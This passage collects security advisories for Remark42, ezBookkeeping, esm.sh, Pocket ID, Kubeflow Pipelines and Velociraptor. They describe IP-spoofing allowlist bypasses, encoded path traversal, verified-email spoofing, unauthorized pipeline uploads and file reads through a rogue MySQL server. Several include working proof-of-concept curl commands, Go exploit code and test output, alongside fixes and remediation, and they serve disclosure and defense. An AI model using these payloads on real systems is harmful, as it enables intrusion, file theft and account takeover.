By rotating the spoofed client IP an attacker bypasses the per-IP token buckets on all rate-limited endpoints and defeats other per-IP controls, enabling: (a) spam comment creation beyond the configured per-IP limit, (b) confirmation-email / notification flooding to supplied addresses, (c) high-volume outbound image fetching and resource consumption via the image proxy (its transport still blocks private/reserved destinations and DNS rebinding, so this is amplification, not new SSRF reach), (d) authentication-endpoint abuse, (e) where `--votes-ip` is enabled, defeating per-IP vote de-duplication (ballot stuffing), and (f) minting fresh anonymous identities and poisoning the stored comment IP and request logs, since the anonymous user ID is derived from `name + RemoteAddr`. The global concurrency ceiling and per-request timeouts remain, so availability impact is limited.

### Resolution
Mitigation support was added in v1.16.2 (umputun/remark42#2116, follow-up in #2118). **Upgrading alone does not remediate the issue: `--trusted-proxy` must be configured.**

The fix adds `--trusted-proxy` / `TRUSTED_PROXY`. When set, the forwarding headers (`X-Real-IP`, then `CF-Connecting-IP`, then the leftmost public `X-Forwarded-For`) are honoured only when the direct TCP peer falls inside a trusted-proxy network; for a request from any other peer those headers are dropped and the real socket IP is used. When it is **unset**, the previous trust-all behaviour is preserved for backward compatibility and a startup warning is logged, so an un-configured v1.16.2 remains exploitable. `True-Client-IP` is no longer recognised. `TRUSTED_PROXY` takes a comma-separated list; on the command line, repeat `--trusted-proxy` per entry.

**Required configuration:**
- **Reachable directly from the internet:** set a value that no real client matches so the forwarding headers are always ignored, e.g. `--trusted-proxy=127.0.0.1/32` (only when Remark42 is not actually reached over loopback).
- **Behind a reverse proxy:** point `--trusted-proxy` at the proxy's network only, block direct access to Remark42, and make the proxy **overwrite** `X-Real-IP` with the real client and discard client-supplied forwarding headers. A proxy that merely appends to `X-Forwarded-For`, or that forwards a client-supplied `X-Real-IP`, still lets the client choose the reported IP. Note that the shipped nginx manual sets `X-Real-IP` but does not strip a client `True-Client-IP`.
- **Before v1.16.2:** strip `True-Client-IP`, `X-Real-IP`, and `X-Forwarded-For` at the edge and set a known-safe client-IP header.

See the [Trusted proxies and client IP docs](https://remark42.com/docs/configuration/parameters/#trusted-proxies-and-client-ip).

summary: ezBookkeeping: Source-IP allowlist (MCP & API token) is bypassable via a spoofed `X-Forwarded-For` header
details:
### Summary
A remote attacker from any IP address defeats the operator-configured source-IP allowlist (`mcp_allowed_remote_ips` / `api_token_allowed_remote_ips`) by sending a single `X-Forwarded-For: <allowlisted-ip>` header. The router is created with `gin.New()` and never calls `SetTrustedProxies`, so gin trusts every proxy by default and `c.ClientIP()` returns the attacker-supplied header verbatim. The same forged value is also written to `Transaction.CreatedIp` and the access log, so the attacker's real IP never appears in any record.

### Details
`cmd/webserver.go:104` builds the router with `gin.New()`. A grep of `cmd/` and `pkg/` confirms `SetTrustedProxies` is never called, leaving gin's default trusted-proxy range of `0.0.0.0/0` and `::/0`. `WebContext` (`pkg/core/context_web.go:39`) embeds `*gin.Context` and does not override `ClientIP()`.

Both allowlist middlewares match the operator allowlist against this attacker-controlled value:

```go
// pkg/middlewares/mcp_server_ip_limit.go:19
if config.MCPAllowedRemoteIPs[i].Match(c.ClientIP()) { c.Next(); return }
```

The identical `c.ClientIP()` is consumed by the audit trail at `pkg/api/transactions.go:1078` (`createNewTransactionModel(..., c.ClientIP())` → `CreatedIp`) and the access log (`pkg/middlewares/request_log.go:28`), so one header both bypasses the gate and forges attribution.

### PoC
Runtime PoC (no live deployment required) — `pkg/middlewares/xff_bypass_runtime_test.go`, `pkg/middlewares/xff_chain_runtime_test.go`:

```
go test ./pkg/middlewares/ -run 'TestACCESSCONTROL001_XFFBypass|TestCHAIN_AllowlistBypass' -v
```

Output:
```
[control] no XFF, RemoteAddr=1.2.3.4 -> status=400 (correctly blocked)
[exploit] XFF=10.0.0.1, RemoteAddr=1.2.3.4 -> status=200, ClientIP=10.0.0.1 (bypassed)
gate status = 200 | created_ip that would be persisted = "10.0.0.1"
```

Against a live instance with `mcp_allowed_remote_ips=10.0.0.1`:
```
curl -s -o /dev/null -w "%{http_code}\n" https://target/mcp            # 403 (blocked)
curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-For: 10.0.0.1" https://target/mcp  # passes IP gate
```

### Impact
Defeats an explicitly advertised, operator-configured security control on the MCP and API-token surfaces, from any source IP, with a single header and no authentication to the gate itself. It also destroys non-repudiation: every action is logged under the spoofed allowlisted IP, so audit trails point at the trusted host instead of the attacker. (The MCP/API actions themselves still require a valid token — this neutralizes the compensating IP control, not the JWT layer.)

esm.sh: web.NewHandler allows arbitrary file read via encoded dot-segment path traversal
details:
### Summary The documented `web.NewHandler` static file server can read files outside `Config.AppDir` when the request path contains URL-encoded dot-segments such as `%2e%2e`. Go's `ServeMux` redirects plain `/../` paths, but it passes encoded dot-segments to the handler after decoding `r.URL.Path`. The handler then calls `filepath.Join(s.config.AppDir, r.URL.Path)` without checking that the result remains under `AppDir`, allowing unauthenticated arbitrary file reads with the server process privileges. ### Details `web/README.md:34-40` documents a network-facing setup: ```go http.Handle("GET /", web.NewHandler(web.Config{ AppDir: "/path/to/webapp", Fallback: "/index.html", Dev: false, })) log.Fatal(http.ListenAndServe(":8080", nil)) ``` In `web/handler.go:62-75`, the handler takes `r.URL.Path` and joins it directly with `s.config.AppDir`: ```go pathname := r.URL.Path filename := filepath.Join(s.config.AppDir, pathname) fi, err := os.Lstat(filename) ``` Later the same resolved filename is opened and copied to the response in `web/handler.go:150-166` for non-HTML/static files. There is no `filepath.IsLocal`, cleaned-relative-path, absolute-root prefix, or symlink-aware containment check before opening the file. A plain `/../secret.txt` path is redirected by Go's `ServeMux`, but an encoded path such as `/%2e%2e/secret.txt` is decoded into `r.URL.Path == "/../secret.txt"` and reaches the handler. On Linux, `filepath.Join("/tmp/root/app", "/../secret.txt")` resolves to `/tmp/root/secret.txt`, outside the configured app directory. Source-to-sink chain: ```text Unauthenticated HTTP request path containing URL-encoded dot-segments -> net/http decodes path into r.URL.Path -> documented ServeMux setup passes encoded dot-segment path to web.NewHandler -> web/handler.go joins Config.AppDir with r.URL.Path -> os.Lstat/os.Open operate on the escaped path -> io.Copy returns file contents to the attacker ``` False-positive checks performed: - Plain dot-segment paths are redirected by `http.ServeMux`, but encoded dot-segments are not blocked and reach the handler. - The PoC uses the documented `http.Handle("GET /", web.NewHandler(...))` setup, not a custom bypass of ServeMux. - A control request for `/secret.txt` does not read the outside file; the disclosure requires encoded traversal segments. - The issue is independent of `Dev`/HMR; it reproduces with `Dev: false`. - The root cause appears in other handler paths that join app paths, but the static file read path is sufficient to prove arbitrary file disclosure. Candidate score: 18/18 under the local audit scoring rubric. The handler is documented for network-facing use, the attacker directly controls the request path, the path reaches `os.Open`, file disclosure was reproduced locally, and no root containment mitigation is present. ### PoC This safe local proof creates an application directory and a sibling secret file outside it, registers the handler exactly as documented, and requests the sibling file through encoded `..` path segments. ```go package main import ( "fmt" "net/http" "net/http/httptest" "os" "strings" "github.com/esm-dev/esm.sh/web" ) func main() { mux := http.NewServeMux() mux.Handle("GET /", web.NewHandler(web.Config{AppDir: os.Args[1], Dev: false})) for _, target := range []string{ "http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt", "http://example/secret.txt", } { rr := httptest.NewRecorder() req := httptest.NewRequest("GET", target, nil) mux.ServeHTTP(rr, req) fmt.Printf("%s => status=%d location=%q contains_secret=%v body=%q\n", target, rr.Code, rr.Header().Get("Location"), strings.Contains(rr.Body.String(), "ancestor-secret-marker"), rr.Body.String(), ) } } ``` Maintainer-runnable clean-checkout recipe: ```sh tmp=$(mktemp -d) mkdir -p "$tmp/root/a/b/app" printf 'ancestor-secret-marker' > "$tmp/root/secret.txt" printf '

inside

' > "$tmp/root/a/b/app/index.html" cat > "$tmp/poc.go" <<'EOF' [place the PoC above here] EOF go run "$tmp/poc.go" "$tmp/root/a/b/app" rm -rf "$tmp" ``` Observed vulnerable output in this environment: ```text http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker" http://example/secret.txt => status=200 location="" contains_secret=false body="

inside

" ``` Final re-check after drafting reproduced the same output: ```text http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker" http://example/secret.txt => status=200 location="" contains_secret=false body="

inside

" ``` Additional parser/control evidence observed locally: ```text http://example/../secret.txt => status=307 loc="/secret.txt" handler Path="/../secret.txt" RawPath="/%2e%2e/secret.txt" http://example/%2e%2e/secret.txt => status=204 loc="" http://example/a/../../secret.txt => status=307 loc="/secret.txt" ``` This confirms that the documented `ServeMux` setup redirects plain traversal paths but lets encoded dot-segments reach the handler. ### Impact An unauthenticated remote attacker can read files that are outside the configured web application directory but readable by the server process. Depending on deployment layout and process privileges, this can disclose source files, configuration files, environment-adjacent files, build artifacts, local credentials, private keys, or other application secrets located in ancestor or sibling directories. The impact is limited to file disclosure in the confirmed path. No write primitive or code execution was confirmed in this audit. ### Suggested remediation Normalize request paths into a cleaned relative path before joining them with `AppDir`, and reject any path that is not local. A robust pattern is: - reject paths containing NUL bytes, - use `path.Clean("/" + r.URL.EscapedPath())` or an equivalent URL-path canonicalization step, - trim the leading slash and reject non-local paths with `filepath.IsLocal`, - join only the validated relative path to `AppDir`, - optionally compare absolute cleaned paths to ensure the result remains inside the absolute app root, - consider symlink policy explicitly if symlinks inside `AppDir` should not escape the app root. Add regression tests for `/%2e%2e/secret.txt`, multi-level encoded traversal, plain `/../` behavior, and normal in-app file serving. ### Credits - Thai Son Dinh from VinSOC Labs (R&D)

summary: Pocket ID: Email verification token remains valid after address change, enabling arbitrary verified-email spoofing
details:
## Summary

An authenticated Pocket ID user can request an email-verification token while their account uses an address they control, change the account email address, and then redeem the previously issued token. The token is bound only to the user ID, not to the address to which it was sent, and changing the address does not revoke outstanding tokens.

As a result, Pocket ID marks the newly supplied address as verified even though the user never proved control of it. Pocket ID subsequently returns that address with `email_verified: true` in OIDC claims. A relying party that trusts this claim for email-based account linking or provisioning can therefore link the attacker's Pocket ID identity to a victim's existing account, leading to cross-application account takeover.

This was verified against commit `9f559788a44cfea790de360da0a74d4bdf8ca5d5`.

## Preconditions

- The attacker has an ordinary Pocket ID user account.
- Email verification is in use (`emailsVerified=false`, which is the default).
- The user can edit their own account (`allowOwnAccountEdit=true`, which is the default).
- The target address is not already assigned to another Pocket ID user.
- For downstream account takeover, a relying party links or provisions users based on a trusted, verified email address. Applications that rely exclusively on the stable OIDC `sub` claim are not affected by that downstream consequence.

No administrator privilege, victim interaction, or access to the victim's mailbox is required.

## Reproduction through the API

1. Sign in as an ordinary user whose current email address is controlled by the attacker, for example `attacker@example.test`.
2. Call `POST /api/users/me/send-email-verification`.
3. Obtain the token from the message delivered to `attacker@example.test`, but do not redeem it yet.
4. Call `PUT /api/users/me` and change the account email to an address the attacker does not control, for example `victim@example.test`.
5. Observe that the new address is initially stored with `emailVerified: false`.
6. Call `POST /api/users/me/verify-email` with the token delivered to `attacker@example.test`.
7. Call `GET /api/users/me`. The current address is now `victim@example.test` and `emailVerified` is `true`.
8. Complete an OIDC flow with the `email` scope. Pocket ID emits:

```json
{
  "email": "victim@example.test",
  "email_verified": true
}
```

The old token has therefore verified a different address from the one to which it was delivered.

## Executable regression test / proof of concept

Save this as `backend/internal/service/audit_email_verification_test.go` and run:

```text
go test -tags=exclude_frontend,unit ./internal/service -run TestAuditEmailVerificationTokenSurvivesEmailChange -count=1 -v
```

The test passes on the referenced commit and demonstrates the unintended state transition:

```go
package service

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/pocket-id/pocket-id/backend/internal/appconfig"
	"github.com/pocket-id/pocket-id/backend/internal/dto"
	"github.com/pocket-id/pocket-id/backend/internal/model"
	datatype "github.com/pocket-id/pocket-id/backend/internal/model/types"
)

func TestAuditEmailVerificationTokenSurvivesEmailChange(t *testing.T) {
	userService, _ := newTestUserService(t)
	config := &appconfig.AppConfigModel{
		RequireUserEmail:    "true",
		AllowOwnAccountEdit: "true",
		EmailsVerified:      "false",
	}

	attackerEmail := "attacker-controlled@example.test"
	user, err := userService.CreateUser(t.Context(), config, dto.UserCreateDto{
		Username:      "attacker",
		Email:         &attackerEmail,
		EmailVerified: false,
	})
	require.NoError(t, err)

	const tokenFromAttackerMailbox = "token-issued-for-attacker-email"
	require.NoError(t, userService.db.Create(&model.EmailVerificationToken{
		UserID:    user.ID,
		Token:     tokenFromAttackerMailbox,
		ExpiresAt: datatype.DateTime(time.Now().Add(time.Hour)),
	}).Error)

	victimEmail := "victim@example.test"
	_, err = userService.UpdateUser(t.Context(), config, user.ID, dto.UserCreateDto{
		Username: user.Username,
		Email:    &victimEmail,
	}, true, false)
	require.NoError(t, err)

	changed, err := userService.GetUser(t.Context(), user.ID)
	require.NoError(t, err)
	require.Equal(t, victimEmail, *changed.Email)
	require.False(t, changed.EmailVerified)

	require.NoError(t, userService.VerifyEmail(
		t.Context(),
		user.ID,
		tokenFromAttackerMailbox,
	))

	verified, err := userService.GetUser(t.Context(), user.ID)
	require.NoError(t, err)
	require.Equal(t, victimEmail, *verified.Email)
	require.True(t, verified.EmailVerified)
}
```

Observed result:

```text
=== RUN   TestAuditEmailVerificationTokenSurvivesEmailChange
--- PASS: TestAuditEmailVerificationTokenSurvivesEmailChange
PASS
```

## Root cause

`backend/internal/model/email_verification_token.go` stores only a token, expiration, and user ID. It does not store or cryptographically bind the address being verified.

`UserService.SendEmailVerification` creates the token for `user.ID` and sends it to the current `user.Email`, but that email is not part of the token record:

```go
emailVerificationToken := &model.EmailVerificationToken{
	UserID:    user.ID,
	Token:     randomToken,
	ExpiresAt: datatype.DateTime(expiration),
}
```

`UserService.UpdateUser` resets the verification flag when the address changes but leaves existing verification tokens valid.

`UserService.VerifyEmail` validates only the token, user ID, and expiry, then sets `EmailVerified` on the user's current record:

```go
err := tx.WithContext(ctx).Where(
	"token = ? AND user_id = ? AND expires_at > ?",
	token,
	userID,
	datatype.DateTime(time.Now()),
).First(&emailVerificationToken).Error

user, err := s.getUserInternal(ctx, emailVerificationToken.UserID, tx)
// ...
user.EmailVerified = true
```

Finally, `backend/internal/oidc/claims_service.go` publishes the current address and flag together:

```go
claims["email"] = *user.Email
claims["email_verified"] = user.EmailVerified
```

## Impact

The direct impact is an authentication-integrity failure in an identity provider: any ordinary user can cause Pocket ID to attest control of an arbitrary unused email address.

The security boundary crossed by that false attestation is the relying application. Where a relying party treats `email_verified=true` as proof of address ownership and uses email for automatic account matching, the attacker can be signed into or linked to the victim's existing relying-party account. This can expose all data and actions available through that account.

## Suggested remediation

1. Store a normalized target email address (or a keyed hash of it) with every verification token.
2. During redemption, atomically require that the stored target address still equals the user's current normalized email address.
3. Invalidate all outstanding email-verification tokens whenever the account email changes.
4. Invalidate prior outstanding tokens when issuing a replacement token.
5. Add a regression test that changes the email after issuance and requires the old token to be rejected.

## Testing note

Source review and test construction were AI-assisted. The finding, affected control flow, preconditions, and executable proof of concept were validated against the referenced Pocket ID commit before submission.

summary: Kubeflow Pipelines API server lacks authorization for shared pipeline uploads
details:
## Summary

In multi-user mode, the Kubeflow Pipelines API server's HTTP multipart upload endpoints (`POST /apis/v2beta1/pipelines/upload` and `POST /apis/v2beta1/pipelines/upload_version`) perform no authorization when the target namespace is empty. The authorization helper `canUploadVersionedPipeline` returns `nil`, skipping `SubjectAccessReview`, whenever the resolved namespace is the empty string (`backend/src/apiserver/server/pipeline_upload_server.go:401-403`). An empty namespace is how KFP addresses shared, cluster-wide pipelines and is the default whenever the caller omits the `namespace` query parameter, because `REQUIRE_NAMESPACE_FOR_PIPELINES` defaults to `false` and is unset in every shipped manifest. As a result, an arbitrary low-privilege tenant (or, when the API server is reachable, an unauthenticated caller) can create cluster-shared pipelines and inject new versions into existing shared pipelines, replacing the container image, command, and args that other tenants execute. The gRPC sibling for the same write, `canAccessPipeline`, instead remaps the empty namespace to the system namespace and authorizes, with a comment stating shared-pipeline writes "must still be authorized". That confirms this is an omission, not intended behavior.

## Description

`uploadPipeline` and `uploadPipelineVersion` both build a `ResourceAttributes{Verb: create}` and delegate the access decision to `canUploadVersionedPipeline`:

```go
// backend/src/apiserver/server/pipeline_upload_server.go:387-421
func (s *PipelineUploadServer) canUploadVersionedPipeline(r *http.Request, pipelineID string, resourceAttributes *authorizationv1.ResourceAttributes) error {
	if !common.IsMultiUserMode() {
		return nil
	}
	if len(pipelineID) > 0 {
		namespace, err := s.resourceManager.FetchNamespaceFromPipelineId(pipelineID)
		if err != nil {
			return util.Wrap(err, "Failed to authorize with the Pipeline ID")
		}
		if len(resourceAttributes.Namespace) == 0 {
			resourceAttributes.Namespace = namespace
		}
	}
	if resourceAttributes.Namespace == "" {
		return nil          // empty namespace = no SubjectAccessReview
	}
	// ... only here does IsAuthorized() run ...
}
```

When the namespace is empty (a shared/cluster-wide pipeline, or simply an upload with no `namespace` parameter), the function returns at line 401-403 and `IsAuthorized` is never reached.

Reachability is the default. `ValidateNamespaceRequired` only rejects an empty namespace when `IsNamespaceRequiredForPipelines()` is true:

```go
// backend/src/apiserver/validation/namespace.go:25-30
func ValidateNamespaceRequired(namespace string) error {
	if common.IsMultiUserMode() && common.IsNamespaceRequiredForPipelines() && namespace == "" {
		return util.NewInvalidInputError("Namespace is required for pipeline operations")
	}
	return nil
}
// backend/src/apiserver/common/config.go:73-74  -> default FALSE
func IsNamespaceRequiredForPipelines() bool {
	return GetBoolConfigWithDefault(RequireNamespaceForPipelines, false)
}
```

`REQUIRE_NAMESPACE_FOR_PIPELINES` (`config.go:41`) defaults to `false` and is not set in any manifest under `manifests/`. So in a default multi-user install, empty namespaces pass validation and flow into the unguarded branch.

The gRPC sibling proves the intended behavior is to authorize empty-namespace writes:

```go
// backend/src/apiserver/server/pipeline_server.go:1290-1306 (canAccessPipeline)
	// Skip authorization for read-only operations on shared pipelines in multi-user mode.
	// Write operations (create, update, delete) on shared pipelines must still be authorized
	// against the KFP system namespace, since shared pipelines have no namespace of their own.
	if s.resourceManager.IsEmptyNamespace(resourceAttributes.Namespace) {
		if resourceAttributes.Verb == common.RbacResourceVerbGet || resourceAttributes.Verb == common.RbacResourceVerbList {
			return nil
		}
		resourceAttributes.Namespace = common.GetPodNamespace()
		// ... IsAuthorized(...) ...
		return nil
	}
```

Reads of shared pipelines intentionally skip authorization; writes must be authorized against the system namespace. The upload endpoints only ever perform writes, yet `canUploadVersionedPipeline` applies the read behavior to them.

## Proof of Concept

Reproduced live against the real API server binary (`ghcr.io/kubeflow/kfp-api-server@sha256:621fdae9bfcc93405eca299c24f715bc7f17dbb76f1b53e8b2b35852e4d7d423`, `MULTIUSER=true`, `REQUIRE_NAMESPACE_FOR_PIPELINES` unset). The API server SA holds `subjectaccessreviews/tokenreviews: [create]` (authz fully functional); identity `attacker@evil.com` has no RBAC anywhere; `victim-ns` exists with no grant to the attacker.

1. Shared (empty-namespace) pipeline create as the unprivileged attacker (HTTP 200):
   ```
   curl -F uploadfile=@pipeline.yaml -H "kubeflow-userid: attacker@evil.com" \
     "http://APISERVER:8888/apis/v2beta1/pipelines/upload?name=shared-pwn"
   -> {"pipeline_id":"80cd99df-...","name":"shared-pwn", ...}
   ```
2. Inject a new version into that shared pipeline, the high-impact primitive (HTTP 200):
   ```
   curl -F uploadfile=@pipeline2.yaml -H "kubeflow-userid: attacker@evil.com" \
     "http://APISERVER:8888/apis/v2beta1/pipelines/upload_version?name=evilversion&pipelineid=80cd99df-..."
   -> {"pipeline_version_id":"32299f65-...","name":"evilversion","pipeline_spec":{ attacker IR }}
   ```
3. Same create with no identity header at all: HTTP 200 (`anon-shared-pwn` created).
4. Negative control, same attacker, `&namespace=victim-ns` (real namespace, no RBAC): HTTP 400, rejected at `pipeline_upload_server.go:135` (the `canUploadVersionedPipeline` error path). Authorization is live; only the empty-namespace branch bypasses it.
5. Asymmetry, gRPC `POST /apis/v2beta1/pipelines` with empty namespace as the same attacker: HTTP 403 PermissionDenied (`ResourceAttributes{Namespace:kubeflow,Verb:create,...}`). The gRPC path remapped empty to the system namespace and authorized.

API server logs corroborate: every empty-namespace upload logs `Upload pipeline called` with no following `Authorizing request`, while every namespaced upload and every gRPC create logs `Authorizing request` then `PermissionDenied`. Database state persists the attacker's `shared-pwn` and `anon-shared-pwn` pipelines and the injected `evilversion`; the denied `ns-pwn` created nothing.

Full scaffolding (`run.sh`, `01-mysql.yaml` through `05-apiserver.yaml`, `pipeline.yaml`, `pipeline2.yaml`) and captured evidence are available on request.

## Impact

In multi-user deployments that permit shared pipelines, a low-privilege tenant can create shared pipelines or add attacker-controlled versions to existing shared pipelines without the required write permission. Direct access to the API server without an authenticating proxy can also expose the bypass to unauthenticated callers; the CVSS vector below assesses the authenticated tenant scenario.

An attacker can upload a malicious version of an existing shared pipeline consumed by a recurring run configured to follow the latest version. On its next scheduled execution, the controller resolves the newly uploaded version and executes it in the consuming run's namespace using its configured service account, without further user interaction. Recurring runs pinned to a specific version or containing an embedded specification are not subject to this automatic substitution.

This automatic path requires an enabled, unpinned recurring run consuming the targeted shared pipeline and an uploaded specification compatible with the run's inputs. Latest-version selection queries the newest ready pipeline version; it does not depend on the `UpdatePipelineVersionByDefault` setting.

The automatic execution path was verified by source inspection, including the `2.17.2` tag: recurring-run creation preserves an unpinned pipeline reference, the scheduled-workflow controller submits it to `CreateRun`, and the API resolves the latest version before constructing the workflow. This is distinct from the live upload-bypass reproduction above; an end-to-end scheduled victim-execution reproduction has not been performed as part of this maintainer assessment.

Execution occurs with the victim workload's permissions and access to its mounted data and credentials. It can compromise confidential data and execution integrity available to that workload. It does not inherently grant access to every secret in the victim namespace or cluster-admin privileges.

### CVSS rationale

The retained CVSS v3.1 vector is **9.6 Critical — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`**.

- **AV:N / AC:L / PR:L:** an authenticated low-privilege tenant can submit a normal multipart version upload targeting a shared pipeline, without shared-pipeline write permission.
- **UI:N:** an existing unpinned recurring run can consume the injected version automatically; no further victim action is required.
- **S:C:** the scored consequence extends from unauthorized modification of the shared pipeline catalog to code execution under a separate victim workload's Kubernetes namespace and service-account authority, not merely modification of another catalog entry.
- **C:H / I:H:** attacker-controlled workload code can compromise the confidentiality and integrity of resources available under that victim execution authority. These impacts do not imply cluster-wide access.
- **A:N:** this vector does not claim an independently established availability impact.

## Patches / Remediation

The fix merged into `master` on September 9, 2026 in [kubeflow/pipelines#14352](https://github.com/kubeflow/pipelines/pull/14352), commit [62516d8c525f146b754cb515cf441dd0290ad841](https://github.com/kubeflow/pipelines/commit/62516d8c525f146b754cb515cf441dd0290ad841).

The upload authorization helper now uses `ResourceManager.IsEmptyNamespace` to recognize both the empty string and the legacy `model.NoNamespace` (`"-"`) representation of shared pipelines. It checks shared writes against the configured KFP system namespace through `IsAuthorized`, requiring `create` on the `pipelines` resource in the `pipelines.kubeflow.org` API group. This matches the gRPC shared-write policy without changing the stored pipeline namespace. Namespaced authorization, single-user behavior, and intentional latest-version scheduling remain unchanged.

The original fix by Vito Carolillo (@vcrll) was carried forward with its authorship and DCO sign-off preserved. Separate maintainer commits added regression coverage, sentinel handling, and test-harness compatibility corrections.

### Validation

- 32 endpoint regression cases cover both v1beta1 and v2beta1 pipeline and pipeline-version uploads: allowed and denied shared writes (empty and sentinel namespaces), namespaced writes, and single-user behavior. Tests verify exact SubjectAccessReview attributes and preservation of stored namespaces.
- A negative control restoring the original early return caused the new shared-upload tests to fail, including denied requests returning HTTP 200 without an authorization check.
- The full server unit-test package and changed-package lint passed during remediation.
- E2E test clients were corrected to send their generated authentication token and target the tenant namespace for HTTP uploads. Kubernetes-native clients retain their constructor-configured namespace rather than receiving an unsupported upload parameter. Helper regression tests and E2E/API package compilation passed.

### Release status and upgrade guidance

The first fixed release is **[2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Releases through **2.17.3** remain affected; the affected-version upper bound is `<= 2.17.3` and the patched version is `2.18.0`.

The 2.18 [RBAC and client migration guide](https://github.com/kubeflow/pipelines/blob/2.18.0/docs/operator-guides/rbac-migration-2.18.md) is included through [PR #14655](https://github.com/kubeflow/pipelines/pull/14655). Related trusted-scheduling changes do not replace upload authorization or remove previously uploaded versions. Roll out the matching server/manifests and review existing shared versions and schedules.

In multi-user deployments, callers that previously relied on unauthenticated or unauthorized shared uploads will now be rejected:

- **UI:** choose **Private** (the default in the upload dialog) for tenant-owned pipelines. **Shared** uploads require an authorized shared-pipeline writer.
- **Python SDK:** explicitly pass the tenant namespace, for example `client.upload_pipeline("pipeline.yaml", namespace="my-namespace")`. Setting `Client(namespace=...)` alone does not populate this upload argument.
- **New versions:** inherit the existing pipeline's namespace. Existing shared pipelines must be maintained by an identity with the required system-namespace pipeline permission, or re-uploaded as new namespaced pipelines with consuming runs and schedules repointed.
- **Kubernetes-native uploads:** retain their existing client-configured namespace contract.

Do not grant blanket system-namespace access or restore the authorization bypass to preserve old upload scripts. Grant only the required pipeline-write permission to designated shared-pipeline maintainers.

As an interim hardening measure before deploying the fix, operators can set `REQUIRE_NAMESPACE_FOR_PIPELINES=true` to reject empty-namespace pipeline operations, with the corresponding compatibility impact on shared uploads.

Restoring upload authorization does not remove previously uploaded malicious versions or migrate existing pipelines and runs. Operators should review shared-pipeline versions and consuming recurring runs for unauthorized changes; pinning to a reviewed version prevents subsequent latest-version substitution.

The visualization authorization issue is tracked separately in [GHSA-w9j6-6675-75m4](https://github.com/kubeflow/pipelines/security/advisories/GHSA-w9j6-6675-75m4) and is outside this fix's scope.

## Resources

- `backend/src/apiserver/server/pipeline_upload_server.go:387-421` (`canUploadVersionedPipeline`; bypass at `:401-403`), `:118-138`, `:290-312`
- `backend/src/apiserver/server/pipeline_server.go:1290-1306` (`canAccessPipeline`; load-bearing comment `:1290-1292`)
- `backend/src/apiserver/validation/namespace.go:25-30`
- `backend/src/apiserver/common/config.go:41`, `:73-74`
- `backend/src/apiserver/resource/resource_manager.go` (`CreateJob`, `fetchPipelineVersionFromPipelineSpec`, `CreateRun`)
- `backend/src/crd/controller/scheduledworkflow/controller.go` (`submitNewWorkflowIfNotAlreadySubmitted`)
- `backend/src/apiserver/storage/pipeline_store.go` (`GetLatestPipelineVersion`)
- Distinct from CVE-2023-6570 and CVE-2023-6571 (both in `kubeflow/kubeflow`, different components and classes).

<!-- maintainer-family-cleanup:2026-09-04 -->
### Maintainer disposition

This is the canonical advisory for the **shared pipeline upload authorization** family. Related submissions closed as duplicates or superseded by this canonical:

- [GHSA-87q5-j5jh-fhp8](https://github.com/kubeflow/pipelines/security/advisories/GHSA-87q5-j5jh-fhp8)

Each linked submission retains its own reporter attribution. A cross-link does not transfer authorship or grant co-reporter credit on this advisory. The fix merged through [#14352](https://github.com/kubeflow/pipelines/pull/14352) on September 9, 2026. The fix is available in 2.18.0. This advisory remains a maintained draft pending publication; CVE-2026-77596 and the 9.6 CVSS score are unchanged.

The earlier [private PR #1](https://github.com/kubeflow/pipelines-ghsa-rjr3-43j3-4q8g/pull/1) is closed as superseded by [public PR #14352](https://github.com/kubeflow/pipelines/pull/14352) and the released follow-ups described above. The private branch and review history are retained; this closure does not dismiss the report or change reporter credit. The advisory remains a draft pending the publication review.

summary: Velociraptor: Low-priv analyst reads arbitrary server files via ungated sql() VQL plugin
details:
## Summary

The `sql()` VQL plugin runs a caller-supplied database driver and connection string with no permission check (`vql/parsers/sql/sql.go:93`, `SQLPlugin.Call`). For `driver='mysql'` or `driver='postgres'` the handle comes from `GetHandleOther` (`sql.go:39`), which passes the connection string straight to Go `database/sql` `sql.Open` (`sql.go:51`) and executes the query (`sql.go:159`).

The plugin declares `FILESYSTEM_READ` only as `Info().Permissions` metadata (`sql.go:219`). That metadata is never consulted at runtime: `metadata.go:19` stores it as a string that only the documentation exporter reads (`api/reflect.go:82-110`). Every sibling network plugin (`http_client`, `netcat`, `s3`, `rsyslog`) calls `CheckAccess(acls.NETWORK)` in its own body; `sql()` calls nothing.

The built-in `analyst` role holds `ANY_QUERY` but not `FILESYSTEM_READ` or `NETWORK` (`acls/roles.go:222`), and reaches this sink through the notebook query API.

Result: a low-priv analyst opens arbitrary outbound TCP connections and, through a rogue MySQL server's `LOAD DATA LOCAL INFILE`, reads any file the root-running server can read, including the deployment CA private key.

## Affected

- Velocidex/velociraptor server, `<= v0.77.1` (latest release, 2026-06-23). Identical vulnerable code in `master` HEAD `1961e79` (2026-07-17).
- Confirmed live-exploitable on the official `ghcr.io/velocidex/velociraptor-server:latest` image (build 0.77.1, commit bbe2a58).
- Stock install, default Basic authenticator, any built-in `analyst`, `investigator`, or `api` role (all hold `ANY_QUERY`, none holds `FILESYSTEM_READ` or `NETWORK`).
- No non-default flag required.

## Root cause

`SQLPlugin.Call` (`vql/parsers/sql/sql.go:93`) parses the caller `driver`, `connstring`, and `query` arguments and reaches `handle.Query` (`sql.go:159`) without any `vql_subsystem.CheckAccess` call in its body. For `driver='mysql'` or `driver='postgres'` the handle comes from `GetHandleOther` (`sql.go:39`), which hands the attacker connection string to `sql.Open` (`sql.go:51`), so the plugin dials an arbitrary host and, through the MySQL client `LOAD DATA LOCAL INFILE` feature, reads local files. The plugin states its intended gate only as metadata, `VQLMetadata().Permissions(acls.FILESYSTEM_READ)` (`sql.go:219`), but `MetadataBuilder.Permissions` merely stores a string (`vql/metadata.go:19`) that is read only by the reflection exporter (`api/reflect.go:82-110`), never by the query engine. Every sibling network plugin enforces `CheckAccess(acls.NETWORK)` in its own body, so the omission in `sql()` is an enforcement oversight. The default `analyst` role grants `ANY_QUERY` without `FILESYSTEM_READ` or `NETWORK` (`acls/roles.go:222`), so a user the operator deliberately restricted still reaches the ungated sink.

